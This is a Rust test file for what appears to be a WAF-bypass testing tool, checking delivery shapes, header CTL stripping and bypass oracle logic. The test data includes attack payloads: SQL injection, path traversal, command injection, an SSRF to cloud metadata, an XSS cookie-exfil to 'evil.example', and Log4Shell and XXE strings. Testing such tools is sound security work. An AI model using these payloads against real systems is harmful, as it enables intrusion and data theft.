    use super::*;
    use grammar::equiv::DeliveryShape as D;

    /// §13 dogfood (cumulus): obs-text (high-byte) payloads are LEGAL
    /// HTTP header values (RFC 7230), they must form real membership
    /// queries, not die as "builder errors". CTL bytes (0x00-0x1F,
    /// 0x7F) are STRIPPED before `from_bytes` (matching `to_request`
    /// and `effective_payload`), so the backend receives the payload
    /// without them. The oracle validates the effective (post-strip)
    /// payload, so a stripped CTL that changes the attack is caught as
    /// "not a valid attack" rather than erroring the send.
    #[test]
    fn header_value_accepts_obs_text_strips_ctl() {
        // High bytes (overlong-UTF-8 / raw-byte evasion) (sendable).
        assert!(header_value_from_payload("caf\u{e9}").is_ok());
        assert!(header_value_from_payload("\u{ff}\u{fe}admin").is_ok());
        // Ordinary attack payloads (sendable).
        assert!(header_value_from_payload("' OR 1=1-- -").is_ok());
        // CTL bytes (CR/LF/NUL/VT/FF) are stripped, not rejected.
        // The send succeeds with the CTL removed; the oracle checks
        // the effective payload to catch any semantic change.
        assert!(header_value_from_payload("x\r\ny").is_ok());
        assert!(header_value_from_payload("x\nINJECT: evil").is_ok());
        assert!(header_value_from_payload("x\u{0}y").is_ok());
        // The stripped result is the effective payload (CTL removed).
        assert_eq!(header_value_from_payload("x\r\ny").unwrap(), "xy");
    }

    #[test]
    fn class_mapping_only_returns_supported_classes() {
        assert_eq!(class_for_payload_type(PayloadType::Sql), Some("sql"));
        assert_eq!(class_for_payload_type(PayloadType::Xss), Some("xss"));
        assert_eq!(
            class_for_payload_type(PayloadType::CommandInjection),
            Some("cmdi")
        );
        assert_eq!(
            class_for_payload_type(PayloadType::PathTraversal),
            Some("path")
        );
        assert_eq!(
            class_for_payload_type(PayloadType::TemplateInjection),
            Some("ssti")
        );
        assert_eq!(class_for_payload_type(PayloadType::Ldap), Some("ldap"));
        // Unknown / unsupported → None (anti-rig: never guess a class).
        assert_eq!(class_for_payload_type(PayloadType::Unknown), None);
    }

    #[test]
    fn live_query_appends_to_existing_query_string() {
        let r = build_live_request_for_delivery(
            "https://t.example/search?lang=en",
            &D::Query { param: "q".into() },
            "1' OR '1'='1",
        );
        assert_eq!(r.method, Method::Get);
        assert!(r.url.starts_with("https://t.example/search?"), "{}", r.url);
        assert!(r.url.contains("lang=en"), "lost existing query: {}", r.url);
        assert!(
            r.url.contains("q=1%27"),
            "payload not appended/encoded: {}",
            r.url
        );
        assert!(
            !r.url.contains("/get?"),
            "live path must hit the real URL, not httpbin"
        );
    }

    #[test]
    fn live_path_segment_inserts_before_query() {
        let r = build_live_request_for_delivery(
            "https://t.example/api?v=2",
            &D::PathSegment,
            "../../etc/passwd",
        );
        assert!(r.url.starts_with("https://t.example/api/"), "{}", r.url);
        assert!(
            r.url.ends_with("?v=2"),
            "query must survive after the segment: {}",
            r.url
        );
        assert!(
            !r.url.contains("/anything/"),
            "live path must not use httpbin route"
        );
    }

    #[test]
    fn live_form_and_json_post_to_the_real_target() {
        let f = build_live_request_for_delivery(
            "https://t.example/login",
            &D::FormBody {
                param: "user".into(),
            },
            "a' OR 1=1-- -",
        );
        assert_eq!(f.method, Method::Post);
        assert_eq!(f.url, "https://t.example/login");
        assert!(
            f.headers
                .iter()
                .any(|(k, v)| k == "content-type" && v == "application/x-www-form-urlencoded")
        );
        assert!(String::from_utf8_lossy(f.body.as_ref().unwrap()).starts_with("user="));

        let j = build_live_request_for_delivery(
            "https://t.example/api",
            &D::JsonBody {
                param: "q".into(),
                content_type: None,
            },
            "x\"y",
        );
        assert_eq!(j.url, "https://t.example/api");
        assert!(
            !j.headers.iter().any(|(k, _)| k == "content-type"),
            "JsonBody None must omit Content-Type (the CRS-blind shape)"
        );
        assert_eq!(
            String::from_utf8_lossy(j.body.as_ref().unwrap()),
            r#"{"q":"x\"y"}"#
        );
    }

    #[test]
    fn live_hpp_split_puts_full_payload_last() {
        let r = build_live_request_for_delivery(
            "https://t.example/s",
            &D::HppSplit {
                param: "q".into(),
                parts: 2,
            },
            "UNION SELECT",
        );
        // decoys first, full payload as the last duplicate (last-wins
        // backend binds the attack; WAF sees clean leading values).
        let occurrences = r.url.matches("q=").count();
        assert_eq!(occurrences, 3, "2 decoys + full payload: {}", r.url);
        let last = r.url.rsplit("q=").next().unwrap();
        assert!(
            last.contains("UNION"),
            "payload must be the last q=: {}",
            r.url
        );
    }

    #[test]
    fn verified_bypass_three_gates_hold_here_too() {
        let ok = "1 OR 1=1 --";
        let junk = ")) not sql at all ((";
        assert!(verified_bypass("sql", ok, ok, false, 200));
        assert!(!verified_bypass("sql", ok, ok, true, 200), "WAF-blocked");
        assert!(!verified_bypass("sql", ok, ok, false, 400), "400 malformed");
        assert!(!verified_bypass("sql", ok, junk, false, 200), "non-attack");
        assert!(!verified_bypass("sql", ok, ok, false, 502), "upstream down");
    }

    // ── oracle_valid per class ────────────────────────────────

    #[test]
    fn oracle_valid_unknown_class_refuses_silently_accepting_rig() {
        // ANTI-RIG (LAW 1). The pre-fix behaviour was a permissive
        // `_ => true` fall-through: unknown class → accepted. A typo
        // in the class string upstream would then silently mark every
        // unblocked response as a bypass. Post-fix: unknown class is
        // refused, so the gap is loud and the bench drops the case
        // honestly until a real oracle is wired.
        assert!(!oracle_valid("not_a_class", "x", "x"));
        assert!(!oracle_valid("totally-bogus", "1 OR 1=1", "anything"));
    }

    #[test]
    fn oracle_valid_sql_accepts_valid_tautology() {
        // Numeric-context SQL oracle: `1 OR 1=1` is parseable as an
        // expression injection. With original == transformed the
        // `still_executes` same-attack gate trivially holds (identity is
        // equivalent), and the parse check passes, so an intact tautology
        // is still credited.
        assert!(oracle_valid("sql", "1 OR 1=1", "1 OR 1=1"));
    }

    #[test]
    fn oracle_valid_sql_rejects_tautology_passed_off_as_union_exfil() {
        // SOUNDNESS regression (the CEGIS-moat fix). The original is a
        // structured UNION data-exfil attack; the candidate is a boolean
        // tautology. The tautology IS valid SQLi
        // (`is_valid_expression_injection` returns true for it), so the
        // PRE-FIX `oracle_valid`: which only checked the transformed string
        // and dropped `original`: wrongly credited it as an "equivalent"
        // bypass of the exfil. But a tautology does not exfiltrate the card
        // data: it is a different, weaker attack. The fix requires
        // `still_executes(original, transformed)` too, so the structured
        // tokens (UNION/SELECT/FROM/cards…) must survive. Deleting the
        // `still_executes` conjunct turns this test red.
        let exfil = "1 UNION SELECT cardnum,cvv FROM cards";
        let tautology = "1 OR 1=1-- -";
        // Guard: the tautology really is "valid SQLi" on its own, so this
        // test is exercising the same-attack gate, not the parse gate.
        assert!(
            sql_oracle::is_valid_expression_injection(tautology, DatabaseDialect::Generic),
            "precondition: the tautology must itself parse as valid SQLi, \
             otherwise this test would pass for the wrong reason"
        );
        assert!(
            !oracle_valid("sql", exfil, tautology),
            "a tautology must NOT be credited as equivalent to a UNION exfil"
        );
        // And the sound case still holds: a clean-alphabet / commented
        // re-spelling of the SAME union exfil is accepted.
        assert!(oracle_valid("sql", exfil, exfil));
    }

    #[test]
    fn oracle_valid_sql_rejects_unparseable_noise() {
        // The whole point of the oracle gate.
        assert!(!oracle_valid("sql", "1 OR 1=1", ")) not sql at all (("));
    }

    // ── CEGIS forward-progress (Err arm marks tried) ──────────

    #[tokio::test]
    async fn cegis_errored_candidate_does_not_burn_the_fire_budget() {
        // §7 forward-progress regression (the recorded R2 follow-up).
        //
        // `synthesize` is a PURE deterministic min-score pick over the
        // candidates NOT in `tried`, and the CEGIS `model` only refits on a
        // blocked `Ok`. So if a fired-but-errored candidate is left out of
        // `tried`, the next loop iteration re-synthesizes the IDENTICAL
        // candidate, re-fires the same failing request, and spins until the
        // whole budget is gone (one dead candidate starves the entire pool).
        //
        // Drive the real engine at a closed loopback port so EVERY send errors
        // (connection refused). Pre-fix: the CEGIS `while sends < budget` loop
        // runs to completion, so `out.sends == budget`. Post-fix: each errored
        // candidate is marked `tried`, synthesis advances, and once the pool is
        // exhausted `synthesize` returns `None` and the loop breaks, so
        // `out.sends` is bounded by the (small) candidate pool, far under the
        // budget. Reverting either `tried.insert` in an `Err` arm turns this
        // red (sends jumps back to `budget`).
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(2))
            .build()
            .expect("reqwest client builds");
        // Nothing listens on loopback port 1 → immediate connection-refused.
        let build = |d: &grammar::equiv::DeliveryShape, p: &str| {
            build_request_for_delivery("http://127.0.0.1:1", d, p)
        };
        let budget = 500usize;
        let out = run_equiv_cegis_inner(
            &client,
            build,
            "sql",
            "1 UNION SELECT cardnum FROM cards",
            "cegis-forward-progress-seed",
            "q",
            budget,
            0, // delay_ms
            2, // timeout_secs
            "cegis-fp-test-sig",
            None, // phase_fire_cap (unlimited)
        )
        .await;

        // No `Ok` response ever arrived, so nothing can be credited a bypass.
        assert!(
            out.bypasses.is_empty(),
            "all sends errored, no bypass is provable"
        );
        // The candidate pool (arms × per-arm, post-dedup) is dozens of entries,
        // nowhere near 500. A budget-burn would show as sends == budget.
        assert!(
            out.sends < budget,
            "CEGIS fired {}/{} requests, it re-fired one errored candidate to \
             budget exhaustion instead of advancing (Err arm forgot tried.insert)",
            out.sends,
            budget
        );
    }

    // ── json_escape ───────────────────────────────────────────

    #[test]
    fn json_escape_handles_simple_ascii_unchanged() {
        assert_eq!(json_escape("hello world"), "hello world");
        assert_eq!(json_escape("abc123"), "abc123");
    }

    #[test]
    fn json_escape_escapes_quote_and_backslash() {
        assert_eq!(json_escape(r#""a\b""#), r#"\"a\\b\""#);
    }

    #[test]
    fn json_escape_emits_short_escapes_for_known_controls() {
        assert_eq!(json_escape("\n"), "\\n");
        assert_eq!(json_escape("\r"), "\\r");
        assert_eq!(json_escape("\t"), "\\t");
    }

    #[test]
    fn json_escape_emits_unicode_escape_for_unprintable_controls() {
        // Bell (0x07) has no short-escape; falls to .
        assert_eq!(json_escape("\x07"), "\\u0007");
        // NUL byte.
        assert_eq!(json_escape("\0"), "\\u0000");
        // Vertical tab.
        assert_eq!(json_escape("\x0b"), "\\u000b");
    }

    #[test]
    fn json_escape_passes_high_unicode_through_verbatim() {
        // Anything ≥ 0x20 (printable) flows unchanged, including
        // multi-byte UTF-8. JSON spec permits unescaped non-ASCII
        // as long as it's valid UTF-8.
        assert_eq!(json_escape("café 中文"), "café 中文");
    }

    #[test]
    fn json_escape_output_parses_back_as_valid_json_string() {
        // Round-trip: wrap in `"..."` and serde_json should accept.
        for input in [
            "hello",
            "with \"quotes\"",
            "with \\ backslash",
            "control: \x01\x02\x07",
            "newline:\nand:tab\t",
        ] {
            let wrapped = format!("\"{}\"", json_escape(input));
            let parsed: String =
                serde_json::from_str(&wrapped).expect("escaped output must be valid JSON string");
            assert_eq!(parsed, input, "round-trip mismatch on {input:?}");
        }
    }

    // ── class_for_payload_type ────────────────────────────────

    #[test]
    fn class_for_payload_type_routes_ssrf_nosql_jndi_to_their_sound_oracles() {
        // `classify()` actively returns these three PayloadTypes, and each now
        // has a SAME-EXPLOIT arm in `oracle_valid`. The auto-classifier path
        // (`--class auto`) MUST reach them, previously it dropped all three to
        // `None`, silently demoting `distill`/`tmin` to the WAF-only gate for
        // SSRF, NoSQL, and (most consequentially) Log4Shell payloads.
        assert_eq!(class_for_payload_type(PayloadType::Ssrf), Some("ssrf"));
        assert_eq!(class_for_payload_type(PayloadType::NoSql), Some("nosql"));
        // Jndi is the classifier's name for Log4Shell; the oracle key is
        // "log4shell".
        assert_eq!(class_for_payload_type(PayloadType::Jndi), Some("log4shell"));
    }

    #[test]
    fn class_for_payload_type_ssi_still_none_no_sound_model() {
        // `oracle_valid` has no `ssi` arm, so there is nothing sound to route
        // to (anti-rig: the mapping must NOT invent a class for it).
        assert_eq!(class_for_payload_type(PayloadType::Ssi), None);
        assert_eq!(class_for_payload_type(PayloadType::Unknown), None);
    }

    #[test]
    fn oracle_valid_ssrf_rejects_target_swap_accepts_identity() {
        // The exact over-reduction the weak (`_original`-ignoring) SsrfOracle
        // permitted: an AWS-metadata credential-theft SSRF collapsed to a
        // benign localhost root request. Both are "valid SSRF structure"; only
        // the first is the operator's finding. `still_targets` pins the
        // canonical IPv4 + path, so the swap is now rejected.
        let metadata = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
        let localhost = "http://127.0.0.1/";
        assert!(
            !oracle_valid("ssrf", metadata, localhost),
            "target swap must be rejected, different connect target is a different attack"
        );
        assert!(
            oracle_valid("ssrf", metadata, metadata),
            "identity must hold so distill can validate the original before reducing"
        );
    }

    #[test]
    fn oracle_valid_xss_rejects_dropping_the_exfil_action() {
        // The #1 screwdriver case: ddmin must not silently turn a cookie-exfil
        // finding into a benign alert() PoC. `still_executes_xss` requires the
        // original's class-defining markers (`fetch(`, the exfil host) to
        // survive as whole tokens.
        let exfil = "<svg onload=fetch('//evil.example/'+document.cookie)>";
        let benign = "<svg onload=alert(1)>";
        assert!(
            !oracle_valid("xss", exfil, benign),
            "dropping the exfil sink changes the attack, must be rejected"
        );
        assert!(oracle_valid("xss", exfil, exfil), "identity must hold");
    }

    #[test]
    fn oracle_valid_cmdi_rejects_swapping_the_command() {
        // A `cat /etc/passwd` finding must not reduce to a bare `id` probe
        // different command, different finding. `still_executes_cmd` pins the
        // command verb + target as whole tokens.
        let read_passwd = "; cat /etc/passwd";
        let probe = "; id";
        assert!(
            !oracle_valid("cmdi", read_passwd, probe),
            "swapping the executed command changes the attack, must be rejected"
        );
        assert!(
            oracle_valid("cmdi", read_passwd, read_passwd),
            "identity must hold"
        );
    }

    // ── is_valid_xxe / is_valid_log4shell / is_valid_nosql ────

    #[test]
    fn is_valid_log4shell_identity_holds() {
        // A payload compared against itself must validate.
        let p = "${jndi:ldap://attacker.example/x}";
        assert!(is_valid_log4shell(p, p));
    }

    #[test]
    fn is_valid_xxe_identity_holds() {
        let p = r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>"#;
        assert!(is_valid_xxe(p, p));
    }

    #[test]
    fn is_valid_nosql_identity_holds() {
        let p = r#"{"$ne": null}"#;
        assert!(is_valid_nosql(p, p));
    }

    // ── oracle_valid: cve_pocs + unknown-class anti-rig ────

    #[test]
    fn oracle_valid_cve_pocs_unmutated_is_accepted() {
        // CVE PoCs have no per-CVE oracle. We accept them only when
        // the variant equals the original (intact transmission).
        let p = "CVE-2024-XXXX exploit string";
        assert!(oracle_valid("cve_pocs", p, p));
    }

    #[test]
    fn oracle_valid_cve_pocs_mutated_is_refused() {
        // A mutated cve_pocs payload has no oracle to confirm the
        // exploit survives, pre-fix this returned `true` and inflated
        // bypass counts.
        let original = "CVE-2024-XXXX exploit string";
        let mutated = "CVE-2024-XXXX exploit string ";
        assert!(!oracle_valid("cve_pocs", original, mutated));
    }

    #[test]
    fn oracle_valid_unknown_class_is_refused() {
        // Pre-fix: `_ => true` accepted anything for an unrecognised
        // class. Post-fix: unknown class is refused, the bench/scan
        // will honestly drop the bypass rather than silently rig it.
        assert!(!oracle_valid("not_a_class", "a", "a"));
        assert!(!oracle_valid("", "", ""));
        assert!(!oracle_valid(
            "prototype_pollution",
            "{\"__proto__\":{\"x\":1}}",
            "{\"__proto__\":{\"x\":1}}"
        ));
    }

    #[test]
    fn verified_bypass_unknown_class_returns_false_even_when_gates_pass() {
        // The 3-gate oracle composes oracle_valid AND. With unknown
        // class refusing, even a clean (!blocked, 200) response is NOT
        // a bypass, closes the rig where adding a new class without an
        // oracle silently counted every pass as success.
        assert!(!verified_bypass(
            "future_class_no_oracle",
            "payload",
            "payload",
            false,
            200
        ));
    }

    #[test]
    fn differential_off_is_identical_to_verified() {
        // Anti-rig: with differential OFF, the gate must equal `verified`
        // for BOTH truth values (the headline metric is unchanged).
        assert!(differential_confirmed(true, false, false));
        assert!(differential_confirmed(true, false, true));
        assert!(!differential_confirmed(false, false, true));
        assert!(!differential_confirmed(false, false, false));
    }

    #[test]
    fn differential_on_requires_base_blocked() {
        // A confirmed variant only counts when the un-evaded base was
        // BLOCKED in that delivery (the WAF actually policed the attack).
        assert!(
            differential_confirmed(true, true, true),
            "verified + base-blocked = real bypass"
        );
        assert!(
            !differential_confirmed(true, true, false),
            "verified but base NOT blocked = WAF never policed it → not a bypass"
        );
        // A non-verified variant is never credited regardless of the base.
        assert!(!differential_confirmed(false, true, true));
        assert!(!differential_confirmed(false, true, false));
    }

    /// Exhaustive property over ALL 8 (verified, differential, base_blocked)
    /// combinations, the gate's full truth table, derived independently of
    /// the implementation expression:
    ///   * differential = false  ⇒ result == verified (base_blocked ignored)
    ///   * differential = true   ⇒ result == (verified && base_blocked)
    #[test]
    fn differential_confirmed_full_truth_table() {
        for verified in [false, true] {
            for differential in [false, true] {
                for base_blocked in [false, true] {
                    let expected = if differential {
                        verified && base_blocked
                    } else {
                        verified
                    };
                    let got = differential_confirmed(verified, differential, base_blocked);
                    assert_eq!(
                        got, expected,
                        "differential_confirmed({verified}, {differential}, {base_blocked}) \
                         = {got}, expected {expected}"
                    );
                }
            }
        }
    }

    #[test]
    fn differential_off_ignores_base_blocked_entirely() {
        // With differential OFF, base_blocked must have ZERO influence: for a
        // fixed `verified`, both base values yield the same result.
        for verified in [false, true] {
            assert_eq!(
                differential_confirmed(verified, false, false),
                differential_confirmed(verified, false, true),
                "base_blocked must not affect the result when differential is off"
            );
            assert_eq!(differential_confirmed(verified, false, false), verified);
        }
    }

    #[test]
    fn differential_on_is_logical_and_of_verified_and_base_blocked() {
        // With differential ON, the gate is exactly `verified AND base_blocked`.
        for verified in [false, true] {
            for base_blocked in [false, true] {
                assert_eq!(
                    differential_confirmed(verified, true, base_blocked),
                    verified && base_blocked
                );
            }
        }
    }
    /// Regression: the CumulusFire hunt campaign went from 241 bypasses
    /// to 0 because `enforce_transport_legal` dropped variants whose
    /// payload bytes couldn't legally occupy the delivery channel, and
    /// `header_value_from_payload` errored on CTL bytes (VT/FF from
    /// WS_EQUIV). The fix replaces pre-filtering with empirical
    /// post-strip verification via `effective_payload`. This test
    /// pins the three invariants:
    ///   1. CTL-bearing payloads are sendable (not rejected).
    ///   2. `effective_payload` strips CTL from header/cookie deliveries.
    ///   3. Encoding deliveries (JSON, multipart) preserve the payload.
    #[test]
    fn effective_payload_strips_ctl_from_raw_channels_preserves_encoding() {
        use grammar::equiv::DeliveryShape as D;

        // HeaderValue: CTL bytes (VT, FF, CR, LF, NUL) are stripped.
        let hv = D::HeaderValue { name: "X".into() };
        assert_eq!(hv.effective_payload("UNION\x0BSELECT"), "UNIONSELECT");
        assert_eq!(hv.effective_payload("UNION\x0CSELECT"), "UNIONSELECT");
        assert_eq!(hv.effective_payload("a\r\nb"), "ab");
        assert_eq!(hv.effective_payload("a\u{0}b"), "ab");
        // SP and HTAB are legal header-value octets, preserved.
        assert_eq!(hv.effective_payload("a b"), "a b");
        assert_eq!(hv.effective_payload("a\tb"), "a\tb");

        // Cookie: CTL + ';' are stripped.
        let ck = D::Cookie { name: "q".into() };
        assert_eq!(ck.effective_payload("a;bc"), "abc");
        assert_eq!(ck.effective_payload("a\r\nb"), "ab");

        // Encoding shapes: payload preserved exactly (backend recovers it).
        let json = D::JsonBody {
            param: "q".into(),
            content_type: None,
        };
        assert_eq!(json.effective_payload("UNION\x0BSELECT"), "UNION\x0BSELECT");
        let mp = D::MultipartField { name: "q".into() };
        assert_eq!(mp.effective_payload("UNION\x0BSELECT"), "UNION\x0BSELECT");
        let xml = D::XmlBody {
            root: "r".into(),
            field: "f".into(),
        };
        assert_eq!(xml.effective_payload("UNION\x0BSELECT"), "UNION\x0BSELECT");
    }

    /// Regression: `header_value_from_payload` must NOT reject CTL-bearing
    /// payloads. Pre-fix it returned `Err` for any CTL byte (0x00-0x1F,
    /// 0x7F), causing `send_with_envelope` to error and waste the fire
    /// budget on every VT/FF-bearing payload from `WS_EQUIV`. Now CTL
    /// is stripped before `from_bytes`, so the send succeeds.
    #[test]
    fn header_value_strips_ctl_does_not_error() {
        // VT and FF (from WS_EQUIV) are stripped, not rejected.
        assert!(header_value_from_payload("UNION\x0BSELECT").is_ok());
        assert!(header_value_from_payload("UNION\x0CSELECT").is_ok());
        // The stripped result has CTL removed.
        assert_eq!(
            header_value_from_payload("UNION\x0BSELECT")
                .unwrap()
                .to_str()
                .unwrap(),
            "UNIONSELECT"
        );
        // Multiple CTL bytes all stripped.
        assert_eq!(
            header_value_from_payload("\x01\x02\x03OR\x0B1=1")
                .unwrap()
                .to_str()
                .unwrap(),
            "OR1=1"
        );
        // DEL (0x7F) is also stripped.
        assert!(header_value_from_payload("a\x7Fb").is_ok());
        assert_eq!(
            header_value_from_payload("a\x7Fb")
                .unwrap()
                .to_str()
                .unwrap(),
            "ab"
        );
    }